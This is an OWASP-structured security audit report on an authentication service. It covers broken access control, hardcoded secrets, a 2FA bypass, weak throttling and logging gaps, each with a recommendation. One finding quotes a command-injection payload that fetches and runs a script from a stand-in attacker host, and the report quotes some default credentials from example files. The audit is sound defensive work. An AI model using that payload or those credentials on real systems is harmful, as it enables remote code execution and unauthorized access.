# Security Audit Report

## A01:2021 - Broken Access Control

### Staging role management endpoints allow role assignment/removal without any authorization checks

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-862

**Description:**

The staging controller exposes endpoints that directly assign or retract roles for an arbitrary User route-model binding, but does not enforce any authentication/authorization (no Gate/policy checks, no IsSystemRequest bypass guard, no auth middleware shown in controller). If these routes are reachable in a deployed environment (misconfigured route registration, stage.env middleware misapplied, or environment confusion), an attacker could self-assign privileged roles.

**Attack Scenario:**

An attacker calls the staging endpoint (e.g., /api/.../staging/user-role/addRole/{user}/{role}) with their own user id and a high-privilege role name (admin/operators-admin). Because the controller only checks that the role exists, it assigns the role to the target user. The attacker escalates privileges and gains access to protected APIs.

**Impact:**

Vertical privilege escalation; full compromise of authorization model if privileged roles/abilities can be assigned. Potential data exposure and administrative actions.

**Evidence:**

- **Location:** `app/Http/Controllers/Staging/UserRoleController.php (lines 1-62)`
  - **Chunk ID:** `file:app/Http/Controllers/Staging/UserRoleController.php`
  - **Details:** addRole()/delRole() assigns/retracts roles with no authz checks (only Role existence is validated).

**Recommendation:**

Ensure staging controllers are not deployed or are strictly protected. Add explicit middleware (auth + environment restriction) and authorization checks (Gate::authorize('user-roles.update', $user) or system-only). Prefer removing these endpoints from non-test builds.

---

### Unauthenticated external endpoint can disclose user existence and administrative status via GA UID

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-639

**Description:**

The external GA UID endpoint is registered outside the auth.api middleware group and accepts requests where the FormRequest authorize() returns true. When not logged in, it looks up a user by a provided ga_uid (payload->ga_uid) and returns userId, isAdmin, entity_type, company fields, subscription/account type metadata. This enables IDOR-style enumeration of users and privilege inference without authentication.

**Attack Scenario:**

An attacker submits many ga_uid values (guesses, leaks from analytics, or brute force). For each valid ga_uid, the endpoint returns a non-null userId and whether the user is admin, plus additional profile-related fields. This can be used to enumerate accounts, target admins, and potentially link analytics identifiers to internal user IDs.

**Impact:**

User enumeration, disclosure of privileged status (isAdmin) and account metadata; privacy impact and increased attack targeting capability.

**Evidence:**

- **Location:** `routes/api.php (lines 1-220)`
  - **Chunk ID:** `file:routes/api.php`
  - **Details:** Route group 'external' exposes ga-uid store without auth.api middleware.
- **Location:** `app/Http/Controllers/External/GaUserController.php (lines 1-120)`
  - **Chunk ID:** `file:app/Http/Controllers/External/GaUserController.php`
  - **Details:** If not authenticated, controller finds user by payload->ga_uid and returns userId and isAdmin in response.
- **Location:** `app/Http/Requests/External/StoreGaUserRequest.php (lines 1-39)`
  - **Chunk ID:** `file:app/Http/Requests/External/StoreGaUserRequest.php`
  - **Details:** authorize() returns true; rules allow unauthenticated requests if ga_uid exists in users table.

**Recommendation:**

Require authentication or a signed/server-to-server token for /auth/external/ga-uid. If it must be public, return a generic response that does not reveal userId/isAdmin, and implement strict rate limiting and monitoring. Consider hashing/rotating identifiers and avoid direct lookups by client-provided persistent IDs.

---

### Unauthenticated external endpoint can trigger actions (MailBook subscription) with no authorization

**Finding ID:** `A01-W-CRIT-003`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-862

**Description:**

The external mail-book endpoint is exposed without auth middleware and its FormRequest authorize() returns true. This allows anyone to submit an email address to be added to a mailing list (via MaxMailing::addUser), which is a sensitive action and can be abused.

**Attack Scenario:**

An attacker scripts requests to /auth/external/mail-book with victim emails, causing unsolicited subscriptions (spam), potential reputational/legal issues, and service abuse/cost. Because responses distinguish success/failure, it may also aid email validation.

**Impact:**

Unauthorized state change in external system, abuse of email marketing integration, possible compliance issues.

**Evidence:**

- **Location:** `routes/api.php (lines 1-220)`
  - **Chunk ID:** `file:routes/api.php`
  - **Details:** Route group 'external' exposes mail-book store without auth.api middleware.
- **Location:** `app/Http/Controllers/External/MailBookUserController.php (lines 1-45)`
  - **Chunk ID:** `file:app/Http/Controllers/External/MailBookUserController.php`
  - **Details:** store() calls external MaxMailing->addUser() based solely on request data.
- **Location:** `app/Http/Requests/External/StoreMailBookUser.php (lines 1-38)`
  - **Chunk ID:** `file:app/Http/Requests/External/StoreMailBookUser.php`
  - **Details:** authorize() returns true for everyone.

**Recommendation:**

Protect the endpoint (auth or shared secret/HMAC), apply strict rate limiting, and consider double opt-in workflow. Avoid revealing detailed success/failure differences to unauthenticated clients.

---

## A02:2021 - Cryptographic Failures

### Hardcoded secrets in Kubernetes ConfigMap committed to repo (JWT, DB, RabbitMQ, Pusher, S3, reCAPTCHA) +/-

**Finding ID:** `A02-CRYPTO-001`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-798

**Description:**

Sensitive credentials and cryptographic secrets are stored directly in version-controlled deployment configuration. The Kubernetes ConfigMap includes JWT signing secret, database password, RabbitMQ password, Pusher secret, S3 access keys, and reCAPTCHA secret key. Anyone with read access to the repository (or leaked artifacts) can obtain these secrets.

**Attack Scenario:**

An attacker who gains read access to the repository (e.g., leaked CI logs/artifacts, misconfigured repo permissions, developer machine compromise) extracts JWT_SECRET and other credentials. They can mint valid JWTs (impersonation), access the database/queue, exfiltrate objects from S3, and send broadcast events via Pusher.

**Impact:**

Full compromise of authentication/authorization trust (for JWT-signed integrations), credential reuse against infrastructure components (DB/RabbitMQ/S3), data exfiltration and potential lateral movement across environments.

**Evidence:**

- **Location:** `automation/k8s/cfg/configmap-auth-service.yaml (lines 1-80)`
  - **Chunk ID:** `file:automation/k8s/cfg/configmap-auth-service.yaml`
  - **Details:** ConfigMap contains JWT_SECRET, DB_PASSWORD, RABBITMQ_PASSWORD, PUSHER_APP_SECRET, S3 keys, RECAPTCHA_SECRET_KEY, etc.

**Recommendation:**

Remove all secrets from ConfigMaps and commit history; use Kubernetes Secrets (or an external secret manager) and rotate all exposed credentials immediately.

---

### Hardcoded credentials and app key present in repository example/env files

**Finding ID:** `A02-CRYPTO-002`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-798

**Description:**

Repository includes example environment file and local docker-compose with credentials and secrets (APP_KEY, JWT_SECRET, DB passwords, RabbitMQ password, S3 credentials). Even if intended for local use, these patterns often lead to reuse in real environments and increase secret sprawl. They also aid attackers by providing default passwords/keys to try.

**Attack Scenario:**

An attacker targets a deployed instance where defaults were not changed (common in staging/dev). Using known DB_PASSWORD/auth_secret or JWT_SECRET=some-secret they access services or forge tokens, leading to account takeover or service compromise.

**Impact:**

Potential unauthorized access to databases/queues and token forgery in environments where secrets were reused; accelerates credential stuffing against internal services.

**Evidence:**

- **Location:** `.env.example (lines 1-60)`
  - **Chunk ID:** `file:.env.example`
  - **Details:** Contains APP_KEY, JWT_SECRET=some-secret, DB_PASSWORD, RABBITMQ_PASSWORD=password, S3_LOCAL_AWS_SECRET_ACCESS_KEY=minio123, etc.
- **Location:** `docker-compose.yaml (lines 1-55)`
  - **Chunk ID:** `file:docker-compose.yaml`
  - **Details:** Contains POSTGRES_PASSWORD=auth_secret and app env DB_PASSWORD=auth_secret plus Pusher secrets.

**Recommendation:**

Remove plaintext secrets from tracked files. Replace with placeholders and documentation. Ensure CI blocks committing secrets and rotate any secrets that match these values.

---

## A03:2021 - Injection

### OS Command Injection via shell_exec() with unsanitized GET parameter in QA script

**Finding ID:** `A03-CMD-001`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-78

**Description:**

A QA helper endpoint executes a shell pipeline (redis-cli | tail | awk | tr) and concatenates untrusted user input ($\_GET['phone']) directly into the command string. This allows shell metacharacters (e.g., `;`, `|`, backticks, $(), redirections) to alter the executed command.

**Attack Scenario:**

An attacker calls /build/qa-scripts/qa.php?phone=\";curl http://attacker/pwn.sh|sh;# causing the server to execute arbitrary OS commands under the web server user. Even if intended for QA, if reachable in any environment it becomes RCE.

**Impact:**

Remote Code Execution; theft of environment secrets (REDIS_PASSWORD), lateral movement, data destruction, and complete server compromise.

**Evidence:**

- **Location:** `build/qa-scripts/qa.php (lines 1-4)`
  - **Chunk ID:** `file:build/qa-scripts/qa.php`
  - **Details:** shell_exec() command string concatenates $\_GET['phone'] into a redis-cli shell pipeline.

**Recommendation:**

Remove this script from any deployed environment. If it must exist, restrict access (network allowlist + auth), avoid shell completely (use Redis client library), and strictly validate phone as digits only. Never concatenate user input into shell commands; if unavoidable use escapeshellarg and avoid complex pipelines.

---

## A04:2021 - Insecure Design

### Login endpoint lacks route-level throttling and uses weak, user-controlled rate-limit key

**Finding ID:** `A04-W1`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-307

**Description:**

The API has a global throttle (api middleware group) but the primary credential-based login endpoint is not explicitly protected with a strict, dedicated rate limit. Instead, throttling is implemented via a Redis counter keyed only by the provided email/login string. This design is weaker than route/IP/user throttling because it can be bypassed by rotating usernames/emails and it does not prevent high-rate password spraying across many accounts from one IP. It also ties security control to user input rather than a stable actor identity (IP/device/user).

**Attack Scenario:**

An attacker runs a password-spraying campaign from a small botnet or even a single IP by attempting one password across thousands of known emails. Because the Redis lockout is per-login string, each account stays below the per-user threshold while the attacker can still perform a high volume of attempts overall. If the global throttle is set high (or bypassed for system requests), the attacker can rapidly test many credentials and eventually gain access to at least one account.

**Impact:**

Account compromise via password spraying/brute force; increased fraud risk; increased operational load due to many auth attempts; potential lockout of specific users if attacker targets one email repeatedly.

**Evidence:**

- **Location:** `routes/api.php (lines 1-220)`
  - **Chunk ID:** `file:routes/api.php`
  - **Details:** The route group applies explicit throttling to auth/check and auth/me, but not to auth/login or auth/signature.
- **Location:** `app/Http/Controllers/AuthController.php (lines 1-120)`
  - **Chunk ID:** `file:app/Http/Controllers/AuthController.php`
  - **Details:** On failed login, increments Redis key auth-attempt:<login> with 15-minute TTL; no IP-based or route-level throttling here.
- **Location:** `app/Http/Requests/StoreLoginRequest.php (lines 1-90)`
  - **Chunk ID:** `file:app/Http/Requests/StoreLoginRequest.php`
  - **Details:** Blocks only when Redis auth-attempt:<email> >= 5; key is derived from user-supplied 'email' field.

**Recommendation:**

Add dedicated, strict throttling to /api/auth/auth/login and /api/auth/auth/signature endpoints based on IP + username (and optionally device fingerprint), with escalating penalties and temporary blocks. Prefer Laravel's throttle middleware with a custom key resolver, or a centralized anti-automation service. Keep the Redis per-login counter as a defense-in-depth signal, not the primary control.

---

### Sensitive unauthenticated flows (registration activation, password reset, 2FA code delivery) lack explicit anti-automation controls

**Finding ID:** `A04-W2`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-799

**Description:**

Multiple endpoints that trigger SMS/email delivery or security-sensitive state changes do not show explicit throttling and bot mitigation at the route level: registration activation (which sends SMS), password reset by email/mobile (sends email/SMS), and 2FA get-code (sends/broadcasts a code). While a global API throttle exists, these actions typically require much stricter per-IP/identifier limits, abuse monitoring, and sometimes CAPTCHA/challenge. Additionally, some requests include a skipCaptcha flag for staging, but there is no clear CAPTCHA enforcement in production code paths.

**Attack Scenario:**

An attacker automates requests to password-reset-email or password-reset-mobile to spam victims (email/SMS flood) or to generate operational cost. They can also hit activation SMS endpoints to send repeated codes to a number, impacting availability and user trust. For 2FA get-code, if an attacker obtains/guesses a user_id, they can trigger repeated 2FA messages to harass users or to attempt social engineering.

**Impact:**

SMS/email flooding and financial cost, degraded user experience, potential denial of service for legitimate authentication, increased support workload, and heightened phishing/social-engineering risk.

**Evidence:**

- **Location:** `routes/api.php (lines 1-120)`
  - **Chunk ID:** `file:routes/api.php`
  - **Details:** Routes for password-reset-email, password-reset-mobile, password-reset, register/activate, and two-fa/get-code are defined without explicit throttle middleware beyond global group.
- **Location:** `app/Http/Controllers/ActivateController.php (lines 1-120)`
  - **Chunk ID:** `file:app/Http/Controllers/ActivateController.php`
  - **Details:** Activation flow sends SMS via UserPhoneActivateSMSJob when code is absent; no visible throttling or CAPTCHA check here.
- **Location:** `app/Http/Controllers/PasswordResetEmailController.php (lines 1-60)`
  - **Chunk ID:** `file:app/Http/Controllers/PasswordResetEmailController.php`
  - **Details:** Generates password-reset hash and dispatches email job; no visible throttling/captcha enforcement.
- **Location:** `app/Http/Controllers/PasswordResetMobileController.php (lines 1-80)`
  - **Chunk ID:** `file:app/Http/Controllers/PasswordResetMobileController.php`
  - **Details:** Dispatches PasswordResetSMSJob to send SMS code; no explicit anti-automation controls.
- **Location:** `app/Http/Controllers/TwoFAController.php (lines 1-70)`
  - **Chunk ID:** `file:app/Http/Controllers/TwoFAController.php`
  - **Details:** two-fa/get-code triggers code generation and broadcast/job based on user_id; no explicit throttling shown.

**Recommendation:**

Add strict per-IP and per-target-identifier throttles to these endpoints (email/phone/user_id). Require CAPTCHA or equivalent bot detection for anonymous initiation endpoints (register/email, password-reset-email/mobile) in production. Add abuse monitoring and alerting on spikes. Ensure 2FA code sending is tied to an authenticated/validated pre-auth session and is rate-limited heavily.

---

## A05:2021 - Security Misconfiguration

### Secrets and credentials committed in repository configuration (ConfigMap and .env.example)

**Finding ID:** `A05-W2`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-538

**Description:**

Multiple credentials/secrets are present in tracked configuration files, including DB credentials, JWT secret, Pusher secret, AWS keys, reCAPTCHA secret, and RabbitMQ passwords. Some are present in a Kubernetes ConfigMap (not a Secret), which is not intended for sensitive values.

**Attack Scenario:**

An attacker with access to the code repository, CI logs/artifacts, or cluster ConfigMap read permissions can retrieve secrets. With AWS keys they can access S3 buckets; with JWT_SECRET they can forge tokens; with DB/RabbitMQ credentials they can access backend services.

**Impact:**

Full compromise of confidentiality/integrity: token forgery, unauthorized message publishing/consumption, database access, third-party service abuse, and possible data exfiltration from S3.

**Evidence:**

- **Location:** `automation/k8s/cfg/configmap-auth-service.yaml (lines 1-120)`
  - **Chunk ID:** `file:automation/k8s/cfg/configmap-auth-service.yaml`
  - **Details:** Contains DB_PASSWORD, JWT_SECRET, PUSHER_APP_SECRET, S3 access keys, RECAPTCHA_SECRET_KEY, RabbitMQ password inside ConfigMap.
- **Location:** `.env.example (lines 1-120)`
  - **Chunk ID:** `file:.env.example`
  - **Details:** Contains example secrets/credentials: DB_PASSWORD, PUSHER_APP_SECRET, JWT_SECRET, RabbitMQ admin/password, MinIO keys.
- **Location:** `docker-compose.yaml (lines 1-80)`
  - **Chunk ID:** `file:docker-compose.yaml`
  - **Details:** Contains DB credentials and sets services with credentials in compose file.

**Recommendation:**

Remove all real secrets from the repository history; rotate exposed credentials. Store sensitive values in Kubernetes Secrets or an external secret manager (Vault/ASM/SSM). Keep only non-sensitive placeholders in .env.example and compose files.

---

### Insecure container build: world-writable directories and private SSH key disclosure during build

**Finding ID:** `A05-W4`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-276

**Description:**

The Dockerfile sets storage and bootstrap/cache permissions to 0777 and includes commands that list and output a private SSH key (cat /var/www/.ssh/id_rsa) during build. 0777 permissions enable tampering; printing a private key risks credential leakage via build logs or intermediate image layers.

**Attack Scenario:**

An attacker with access to container runtime, a compromised web process, or shared host can modify world-writable directories to plant malicious files, alter cached config/routes, or influence application behavior. If build logs/artifacts are accessible, the SSH private key can be stolen and used to access private repositories or infrastructure.

**Impact:**

Potential remote code execution or application compromise via writable directories; secret leakage of SSH private keys enabling supply chain compromise.

**Evidence:**

- **Location:** `Dockerfile (lines 1-80)`
  - **Chunk ID:** `file:Dockerfile`
  - **Details:** chmod -Rf 0777 on storage and bootstrap/cache; prints /var/www/.ssh/id_rsa during image build.

**Recommendation:**

Remove any commands that read/print private keys; use build-time SSH forwarding (BuildKit) instead. Set least-privilege permissions (e.g., 0750/0770) and ensure only the app user/group can write. Avoid world-writable directories.

---

## A07:2021 - Identification and Authentication Failures

### 2FA verification bypass: /auth/two-fa/check-code issues access tokens without validating code

**Finding ID:** `A07-CRIT-001`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-287

**Description:**

The 2FA completion endpoint issues an OAuth access token for the provided user_id and clears 2FA codes, but it never verifies that the submitted 2FA code is correct. As a result, an attacker who obtains/guesses a valid 2FA hash (or otherwise reaches this endpoint) can complete 2FA without the OTP, gaining full authenticated access.

**Attack Scenario:**

Attacker obtains a valid 2FA "hash" (e.g., from their own session, via leakage in logs/referrers, or from another user through phishing/shoulder-surfing). They then call POST /auth/two-fa/check-code with that hash and any 6-digit code. Because the controller does not verify the code, it issues a token for user_id derived from the hash and logs the attacker in as that user.

**Impact:**

Complete authentication bypass of the 2FA factor; account takeover for users with 2FA enabled.

**Evidence:**

- **Location:** `app/Http/Controllers/TwoFAController.php (lines 1-60)`
  - **Chunk ID:** `file:app/Http/Controllers/TwoFAController.php`
  - **Details:** checkCode() issues token for $request->user_id and clears codes; no verification of $request->code is performed in controller.
- **Location:** `app/Http/Requests/StoreTwoFARequest.php (lines 1-80)`
  - **Chunk ID:** `file:app/Http/Requests/StoreTwoFARequest.php`
  - **Details:** Validation only calls TwoFAСodeService::validateCodeRequest() in a validator after-hook; it adds an error but does not prevent controller from minting token if controller is reached and request passed validation. Controller itself does not check for validation errors or code correctness.
- **Location:** `app/Services/TwoFAСodeService.php (lines 1-170)`
  - **Chunk ID:** `file:app/Services/TwoFAСodeService.php`
  - **Details:** Contains checkCode() logic, but it is never invoked directly by TwoFAController::checkCode().

**Recommendation:**

Enforce server-side OTP validation in the controller/service before issuing tokens. Only clear codes and mint tokens after successful validation; ensure the validated user_id is bound to the same hash and code. Add audit logging and rate limits specifically for 2FA endpoints.

---

## A08:2021 - Software and Data Integrity Failures

### CI/CD pipeline contains hardcoded Artifactory credentials/API key

**Finding ID:** `A08-W2`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-798

**Description:**

The Bitbucket pipeline configuration hardcodes Docker registry password, Artifactory password, and an API key directly in `bitbucket-pipelines.yml`. This is a CI/CD integrity and supply-chain risk: anyone with read access to the repository can exfiltrate secrets, push malicious images/artifacts, or modify releases.

**Attack Scenario:**

An attacker with repo read access (or who gains access via leaked repo) extracts the Artifactory credentials/API key from the pipeline file, logs into the registry, and pushes a trojaned `auth-service:latest` image. Downstream deployments that pull `latest` then run attacker code.

**Impact:**

Full compromise of build artifacts/images and potentially production clusters; loss of software integrity and potential data breach.

**Evidence:**

- **Location:** `bitbucket-pipelines.yml (lines 1-130)`
  - **Chunk ID:** `file:bitbucket-pipelines.yml`
  - **Details:** Hardcoded `docker login -p ...` and `ARTIFACTORY_PASSWORD` and `--apikey ...` in pipeline variables.

**Recommendation:**

Remove all secrets from versioned pipeline files. Store them in Bitbucket secured variables/secret store, restrict scope/permissions, rotate the leaked credentials immediately, and use short-lived tokens/OIDC where possible.

---

### Dockerfile prints private SSH key during image build

**Finding ID:** `A08-W3`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-312

**Description:**

The production Dockerfile includes commands that list and output the contents of `/var/www/.ssh/id_rsa` during build. This can leak the private key into build logs and potentially into intermediate layers, undermining code provenance (private VCS access) and enabling further supply-chain attacks.

**Attack Scenario:**

A malicious actor with access to CI logs or the build cache retrieves the printed private SSH key and uses it to access private repositories (e.g., internal Bitbucket packages), inject malicious code, or exfiltrate proprietary source.

**Impact:**

Compromise of private repositories and build pipeline trust; potential persistent supply-chain compromise across multiple services.

**Evidence:**

- **Location:** `Dockerfile (lines 1-40)`
  - **Chunk ID:** `file:Dockerfile`
  - **Details:** Build steps: `RUN ls -la /var/www/.ssh/` and `RUN cat /var/www/.ssh/id_rsa`.

**Recommendation:**

Delete the `RUN cat /var/www/.ssh/id_rsa` and any similar debug steps. Use BuildKit SSH forwarding (`--ssh`) or CI-provided ephemeral deploy keys, and ensure private keys are never copied into image layers or logs.

---

## A09:2021 - Security Logging and Monitoring Failures

### Authentication failures are not logged (brute-force and credential stuffing visibility gap)

**Finding ID:** `A09-W-001`

**Severity:** 🚨 **CRITICAL**

**CWE:** CWE-778

**Description:**

Login endpoints increment Redis counters on authentication failure but do not emit any security logs (no username/login identifier normalization, IP, user-agent, reason, or outcome). This prevents detection/alerting on brute-force, credential stuffing, or targeted account attacks, and makes incident response/audit difficult.

**Attack Scenario:**

An attacker performs credential stuffing against /auth/login using many usernames. Because failures are not logged (only Redis counters), defenders have no centralized audit trail to detect patterns across instances, correlate IPs, or trigger SIEM alerts. Attacker can continue until a valid credential is found without generating actionable security telemetry.

**Impact:**

Reduced ability to detect, investigate, and respond to account compromise attempts; weakens monitoring/alerting controls and may increase time-to-detection of breaches.

**Evidence:**

- **Location:** `app/Http/Controllers/AuthController.php (lines 1-214)`
  - **Chunk ID:** `file:app/Http/Controllers/AuthController.php`
  - **Details:** In login(), failed auth only increments Redis 'auth-attempt' counter and returns 422; no Log::warning/info emitted. Similar in signature() for iin-based auth.

**Recommendation:**

Add structured security logging for auth failures/success at the controller/service or via Laravel authentication events (Login/Failed). Include: login identifier (hashed or partially masked), user_id if known, client IP (respecting trusted proxies), user-agent, outcome, and a correlation/request ID. Use appropriate levels (warning for failures, info for success) and ensure logs go to centralized sink.

---
